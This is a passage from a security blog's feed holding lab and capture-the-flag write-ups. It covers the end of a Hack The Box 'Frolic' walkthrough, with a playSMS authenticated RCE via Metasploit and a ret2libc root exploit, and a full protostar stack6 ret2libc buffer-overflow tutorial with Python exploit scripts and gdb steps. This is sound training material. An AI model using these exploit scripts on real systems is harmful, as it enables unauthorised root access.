4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a Hex encoded , let’s decode it. I will use a website called CyberChef : Base64 encoded output , let’s decode one more time : Another esoteric language. But this time it’s a famous one , brainfuck. We will use dcode.fr again : Output : idkwhatispass Let’s try to login to playsms as admin with this password : And it worked. Exploiting Authenticated RCE and getting user There are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a metasploit module for it. The exploit worked and we have a meterpreter session now : We owned user ! Buffer Overflow in rop In the home directory of the user ayush there’s a directory called .binary , which has a binary called rop. we can verify that rop is suid by using find: find /home/ayush/.binary/ -perm -4000 Let’s see what is it doing : So it takes our input and just ouputs it , Let’s try giving it a long string : We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them here We are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it here First of all , gdb is not installed on the box : So I download a static version of gdb from github , and uploaded it to the box through the meterpreter session. upload gdb Let’s find the length of the buffer : So the buffer overflows after 52 chars. Now we need to know the address of /bin/sh , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it , first thing we need to find the offset of /bin/sh in libc , we will use strings to get the address : strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh Offset : 0x0015ba0b Then we need the address of libc , we can use ldd to get it : ldd rop Address : 0xb7e19000 Then we will add the two addresses to get the address of /bin/sh Address of /bin/sh : 0x0015ba0b + 0xb7e19000 = 0xb7f74a0b Now we need the addresses of system() and exit() : Address of system() : 0xb7e53da0 Address of exit() : 0xb7e479d0 Our final exploit will be: #!/usr/bin/python import struct buf = &quot;A&quot; * 52 system = struct.pack(&quot;I&quot; ,0xb7e53da0) exit = struct.pack(&quot;I&quot; ,0xb7e479d0) shell = struct.pack(&quot;I&quot; ,0xb7f74a0b) print buf + system + exit + shell Let’s upload and run it : ./rop `python /tmp/exploit.py` And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Carrier Next Hack The Box write-up : Hack The Box - Curling</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/frolic/0.png" /></entry><entry><title type="html">Buffer Overflow Practical Examples , ret2libc - protostar stack6</title><link href="http://localhost:4000/binary-exploitation/bof6/" rel="alternate" type="text/html" title="Buffer Overflow Practical Examples , ret2libc - protostar stack6" /><published>2019-03-20T00:00:00+02:00</published><updated>2019-03-20T00:00:00+02:00</updated><id>http://localhost:4000/binary-exploitation/bof6</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/bof6/">&lt;hr /&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys--in-the-last-post-about-buffer-overflow-we-exploited-a-buffer-overflow-vulnerability-where-we-were-able-to-inject-a-shellcode-and-escalate-privileges-to-root-but-that-was-possible-because-we-were-able-to-overwrite-the-return-address-to-another-address-on-the-stack-where-we-placed-our-shellcode--but-what-if-the-stack-is-non-executable--we-will-perform-an-attack-called-ret2libc-and-thats-what-we-are-going-to-discuss-today-with-protostar---stack6-without-wasting-more-time-lets-jump-right-in-&quot;&gt;Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in !&lt;/h4&gt;
&lt;h4 id=&quot;read-the-previous-posts-if-you-havent-yet&quot;&gt;Read the &lt;a href=&quot;/categories/#binary-exploitation&quot;&gt;previous posts&lt;/a&gt; if you haven’t yet.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;stack6&quot;&gt;./stack6&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-are-given-the-source-code-of-the-binary-&quot;&gt;As always we are given the source code of the binary :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void getpath()
{
        char buffer[64];
        unsigned int ret;

        printf(&quot;input path please: &quot;); fflush(stdout);

        gets(buffer);

        ret = __builtin_return_address(0);

        if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
                printf(&quot;bzzzt (%p)\n&quot;, ret);
                _exit(1);
        }

        printf(&quot;got path %s\n&quot;, buffer);
}

int main(int argc, char **argv)
{
        getpath();



}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;what-this-code-is-doing-is-just-printing-input-path-please-then-it-stores-our-input-in-a-buffer-of-64-chars-and-finally-it-prints-it-out&quot;&gt;What this code is doing is just printing &lt;code class=&quot;highlighter-rouge&quot;&gt;input path please:&lt;/code&gt; then it stores our input in a buffer of 64 chars and finally it prints it out:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;our-problem-is-this-if-statement-&quot;&gt;Our problem is this &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
                printf(&quot;bzzzt (%p)\n&quot;, ret);
                _exit(1);
        }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-is-making-sure-that-the-return-address-is-not-on-the-stack--which-makes-it-not-possible-to-perform-a-shellcode-injection-like-we-did-in-the-previous-example-we-can-defeat-this-by-a-technique-called-ret2libc&quot;&gt;This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the &lt;a href=&quot;/binary-exploitation/bof5/&quot;&gt;previous example&lt;/a&gt;. We can defeat this by a technique called ret2libc.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ret2libc&quot;&gt;ret2libc&lt;/h3&gt;
&lt;h4 id=&quot;so-what-is-ret2libc--if-we-take-the-word-itself--ret-is-return--2-means-to-and-libc-is-the-c-library-the-idea-behind-ret2libc-is-instead-of-injecting-shellcode-and-jumping-to-the-address-that-holds-that-shellcode-we-can-use-the-functions-that-are-already-in-the-c-library-for-example-we-can-call-the-function-system-and-make-it-execute-binsh-read-about-system-here-we-will-also-need-to-use-the-function-exit-to-make-the-program-exit-cleanly-read-about-exit-here&quot;&gt;So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; and make it execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;. (Read about &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; &lt;a href=&quot;https://www.tutorialspoint.com/c_standard_library/c_function_system.htm&quot;&gt;here&lt;/a&gt;). We will also need to use the function &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; to make the program exit cleanly. (Read about &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; &lt;a href=&quot;https://www.tutorialspoint.com/c_standard_library/c_function_exit.htm&quot;&gt;here&lt;/a&gt;).&lt;/h4&gt;
&lt;h4 id=&quot;so-finally-our-attack-payload-will-be--padding--address-of-system--address-of-exit--binsh-instead-of--padding--new-return-address--nop--shellcode&quot;&gt;So finally our attack payload will be : “padding –&amp;gt; address of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; –&amp;gt; address of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;” instead of : “padding –&amp;gt; new return address –&amp;gt; NOP –&amp;gt; shellcode”.&lt;/h4&gt;
&lt;h4 id=&quot;now-lets-see-how-will-we-do-it&quot;&gt;Now let’s see how will we do it.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploiation&quot;&gt;Exploiation&lt;/h3&gt;
&lt;h4 id=&quot;again--this-will-execute-binsh-as-root-because-this-binary-is-an-suid-binary-if-it-wasnt-suid-we-would-get-a-shell-as-the-same-user-we-can-check-by-using-find-&quot;&gt;Again , this will execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; as root because this binary is an &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binary. If it wasn’t &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; we would get a shell as the same user. We can check by using &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find /opt/protostar/bin/ -perm -4000 | grep stack6&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF6/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;as-you-can-see-stack6-is-an-suid-binary&quot;&gt;As you can see &lt;code class=&quot;highlighter-rouge&quot;&gt;stack6&lt;/code&gt; is an &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binary.&lt;/h4&gt;
&lt;h4 id=&quot;so-first-of-all--after-we-call-system-we-will-need-to-give-it-binsh--how-will-we-do-that--a-nice-way-to-do-it-is-to-store-binsh-in-an-environment-variable-i-created-a-variable-and-called-it-shell-&quot;&gt;So first of all , after we call &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; we will need to give it &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; , how will we do that ? A nice way to do it is to store &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; in an environment variable. I created a variable and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-need-to-find-the-address-of-that-variable--we-can-do-it-from-gdb-by-setting-a-breakpoint-at-main--then-running-the-program-and-doing-this--xs-char-environx-where-x-is-a-number--this-will-print-the-address-of-an-environment-variable-we-will-keep-trying-numbers-until-we-get-the-address-of-shell&quot;&gt;Now we need to find the address of that variable , we can do it from &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; by setting a breakpoint at main , then running the program and doing this : &lt;code class=&quot;highlighter-rouge&quot;&gt;x/s *((char **)environ+x)&lt;/code&gt; where &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt; is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;but-i-found-a-better-way-to-do-it-when-i-was-reading-an-article-on-shellblade-we-will-use-a-c-program-to-tell-us-the-estimated-address&quot;&gt;But I found a better way to do it when I was reading an article on &lt;a href=&quot;https://www.shellblade.net/&quot;&gt;shellblade&lt;/a&gt;. We will use a &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; program to tell us the estimated address.&lt;/h4&gt;
&lt;h4 id=&quot;code-&quot;&gt;Code :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
int main(int argc, char **argv)
{
        char *ptr = getenv(&quot;SHELL&quot;);
        if (ptr != NULL)
        {
                printf(&quot;Estimated address: %p\n&quot;, ptr);
                return 0;
        }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-compile-it--gcc-addressc--o-address-&quot;&gt;Then we will compile it : &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc address.c -o address&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;as-you-can-see-its-telling-us-the-address-of-the-environment-variable-shell-now-keep-in-mind-that-this-is-not-the-exact-address-and-we-will-need-to-go-up-and-down-to-get-the-right-address&quot;&gt;As you can see it’s telling us the address of the environment variable &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt;. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address.&lt;/h4&gt;
&lt;h4 id=&quot;lets-start-by-finding-the-offset-as-we-did-before-we-will-use-pattern_createrb-and-pattern_offsetrb-from-metasploit-exploitation-tools&quot;&gt;Let’s start by finding the offset. As we did before we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_create.rb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_offset.rb&lt;/code&gt; from metasploit exploitation tools.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_create.rb -l 100&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF6/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-our-pattern-now-lets-run-the-program-in-gdb-and-set-a-breakpoint-before-main-break-main-then-we-will-type-c-to-continue-and-paste-the-pattern-the-buffer-will-overflow-and-we-will-see-exactly-where-did-the-overflow-happen-&quot;&gt;We have our pattern now let’s run the program in gdb and set a breakpoint before main &lt;code class=&quot;highlighter-rouge&quot;&gt;break *main&lt;/code&gt;. Then we will type &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-the-address-0x37634136--now-lets-go-back-and-use-pattern_offsetrb-&quot;&gt;We got the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x37634136&lt;/code&gt; , now let’s go back and use &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_offset.rb&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_offset.rb -q 0x37634136&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF6/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-after-80-chars-the-buffer-overflows-next-thing-to-check-is-the-addresses-of-system-and-exit-from-gdb-we-will-set-a-break-point-at-main-and-type-r-to-run-the-program-after-it-reaches-the-break-point-and-breaks-we-can-get-the-address-of-system-by-typing-p-system-and-we-will-do-the-same-thing-for-exit-p-exit-&quot;&gt;So after 80 chars the buffer overflows. Next thing to check is the addresses of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt;. From gdb we will set a break point at main and type &lt;code class=&quot;highlighter-rouge&quot;&gt;r&lt;/code&gt; to run the program. After it reaches the break point and breaks we can get the address of system by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;p system&lt;/code&gt; and we will do the same thing for exit &lt;code class=&quot;highlighter-rouge&quot;&gt;p exit&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;address-of-system--0xb7ecffb0&quot;&gt;Address of system : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7ecffb0&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;address-of-exit--0xb7ec60c0&quot;&gt;Address of exit : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xb7ec60c0&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;lastly-we-will-check-the-address-of-shell-again-because-its-subject-to-change-&quot;&gt;Lastly we will check the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt; again because it’s subject to change :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;address--0xbffff985&quot;&gt;Address : &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff985&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;lets-check-our-notes-&quot;&gt;Let’s check our notes :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;ok--we-are-ready-to-write-our-exploit--we-will-use-struct-import-struct-like-we-did-before-we-will-create-a-variable-for-the-chars-we-will-use-to-fill-the-buffer-and-call-it-buffer--its-value-will-be-80-as&quot;&gt;Ok , we are ready to write our exploit , we will use struct &lt;code class=&quot;highlighter-rouge&quot;&gt;import struct&lt;/code&gt; like we did before. We will create a variable for the chars we will use to fill the buffer and call it &lt;code class=&quot;highlighter-rouge&quot;&gt;buffer&lt;/code&gt; , its value will be 80 A’s.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;buffer = &quot;A&quot; * 80&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-create-3-variables-to-hold-the-addresses-of-system--exit-and-shell-we-will-use-struct-to-reverse-the-addresses&quot;&gt;Then we will create 3 variables to hold the addresses of &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt;. We will use struct to reverse the addresses.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;system = struct.pack(&quot;I&quot; ,0xb7ecffb0)&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;exit = struct.pack(&quot;I&quot; ,0xb7ec60c0)&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;shell = struct.pack(&quot;I&quot; ,0xbffff985)&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-we-will-print-the-payload&quot;&gt;And finally we will print the payload.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;print buffer + system + exit + shell&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;final-script-&quot;&gt;Final script :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import struct

buffer = &quot;A&quot; * 80
system = struct.pack(&quot;I&quot; ,0xb7ecffb0)
exit = struct.pack(&quot;I&quot; ,0xb7ec60c0)
shell = struct.pack(&quot;I&quot; ,0xbffff985)

print buffer + system + exit + shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-to-remember-that-the-address-of-shell-is-not-the-exact-address-and-we-will-need-to-go-up-or-down-for-a-little-bit-we-will-execute-the-script-and-redirect-the-output-to-a-file-and-name-it-payload-python-tmpstack6py--tmppayload--then-we-will-cat-the-file-and-pipe-the-output-to-stack6-&quot;&gt;We have to remember that the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;SHELL&lt;/code&gt; is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. &lt;code class=&quot;highlighter-rouge&quot;&gt;python /tmp/stack6.py &amp;gt; /tmp/payload&lt;/code&gt; , Then we will cat the file and pipe the output to &lt;code class=&quot;highlighter-rouge&quot;&gt;./stack6&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-no-shell--after-going-up-and-down-by-editing-the-address-in-the-python-script-i-finally-got-the-right-address-which-is-0xbffff992-&quot;&gt;And no shell , After going up and down by editing the address in the python script I finally got the right address which is &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff992&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python /tmp/stack6.py &amp;gt; /tmp/payload&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;cat /tmp/payload - | ./stack6&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF6/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;root-shell&quot;&gt;root shell!&lt;/h4&gt;
&lt;h4 id=&quot;so-after-editing-the-address-of-shell-variable--the-script-will-be-like-this-&quot;&gt;So after editing the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; variable , the script will be like this :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import struct

buffer = &quot;A&quot; * 80
system = struct.pack(&quot;I&quot; ,0xb7ecffb0)
exit = struct.pack(&quot;I&quot; ,0xb7ec60c0)
shell = struct.pack(&quot;I&quot; ,0xbffff992)

print buffer + system + exit + shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF6/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-articles--tweet-about-the-article-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous articles&lt;/a&gt; , Tweet about the article if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-buffer-overflow-article--buffer-overflow-practical-examples--shellcode-injection-and-local-privilege-escalation---protostar-stack5&quot;&gt;Previous Buffer Overflow article : &lt;a href=&quot;/binary-exploitation/bof5/&quot;&gt;Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that’s what we are going to discuss today with protostar - stack6. Without wasting more time let’s jump right in ! Read the previous posts if you haven’t yet. ./stack6 As always we are given the source code of the binary : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; void getpath() { char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp;amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } printf(&quot;got path %s\n&quot;, buffer); } int main(int argc, char **argv) { getpath(); } What this code is doing is just printing input path please: then it stores our input in a buffer of 64 chars and finally it prints it out: Our problem is this if statement : if((ret &amp;amp; 0xbf000000) == 0xbf000000) { printf(&quot;bzzzt (%p)\n&quot;, ret); _exit(1); } This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the previous example. We can defeat this by a technique called ret2libc. ret2libc So what is “ret2libc” ? If we take the word itself : “ret” is return , “2” means to and “libc” is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function system() and make it execute /bin/sh. (Read about system() here). We will also need to use the function exit() to make the program exit cleanly. (Read about exit() here). So finally our attack payload will be : “padding –&amp;gt; address of system() –&amp;gt; address of exit() –&amp;gt; /bin/sh” instead of : “padding –&amp;gt; new return address –&amp;gt; NOP –&amp;gt; shellcode”. Now let’s see how will we do it. Exploiation Again , this will execute /bin/sh as root because this binary is an suid binary. If it wasn’t suid we would get a shell as the same user. We can check by using find : find /opt/protostar/bin/ -perm -4000 | grep stack6 As you can see stack6 is an suid binary. So first of all , after we call system() we will need to give it /bin/sh , how will we do that ? A nice way to do it is to store /bin/sh in an environment variable. I created a variable and called it SHELL : Now we need to find the address of that variable , we can do it from gdb by setting a breakpoint at main , then running the program and doing this : x/s *((char **)environ+x) where x is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of SHELL But I found a better way to do it when I was reading an article on shellblade. We will use a c program to tell us the estimated address. Code : #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; int main(int argc, char **argv) { char *ptr = getenv(&quot;SHELL&quot;); if (ptr != NULL) { printf(&quot;Estimated address: %p\n&quot;, ptr); return 0; } } Then we will compile it : gcc address.c -o address : As you can see it’s telling us the address of the environment variable SHELL. Now keep in mind that this is not the “exact” address and we will need to go up and down to get the right address. Let’s start by finding the offset. As we did before we will use pattern_create.rb and pattern_offset.rb from metasploit exploitation tools. ./pattern_create.rb -l 100 We have our pattern now let’s run the program in gdb and set a breakpoint before main break *main. Then we will type c to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : We got the address 0x37634136 , now let’s go back and use pattern_offset.rb : ./pattern_offset.rb -q 0x37634136 So after 80 chars the buffer overflows. Next thing to check is the addresses of system() and exit(). From gdb we will set a break point at main and type r to run the program. After it reaches the break point and breaks we can get the address of system by typing p system and we will do the same thing for exit p exit : Address of system : 0xb7ecffb0 Address of exit : 0xb7ec60c0 Lastly we will check the address of SHELL again because it’s subject to change : Address : 0xbffff985 Let’s check our notes : Ok , we are ready to write our exploit , we will use struct import struct like we did before. We will create a variable for the chars we will use to fill the buffer and call it buffer , its value will be 80 A’s. buffer = &quot;A&quot; * 80 Then we will create 3 variables to hold the addresses of system() , exit() and SHELL. We will use struct to reverse the addresses. system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) And finally we will print the payload. print buffer + system + exit + shell Final script : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; ,0xbffff985) print buffer + system + exit + shell We have to remember that the address of SHELL is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. python /tmp/stack6.py &amp;gt; /tmp/payload , Then we will cat the file and pipe the output to ./stack6 : And no shell , After going up and down by editing the address in the python script I finally got the right address which is 0xbffff992 : python /tmp/stack6.py &amp;gt; /tmp/payload cat /tmp/payload - | ./stack6 root shell! So after editing the address of shell variable , the script will be like this : import struct buffer = &quot;A&quot; * 80 system = struct.pack(&quot;I&quot; ,0xb7ecffb0) exit = struct.pack(&quot;I&quot; ,0xb7ec60c0) shell = struct.pack(&quot;I&quot; 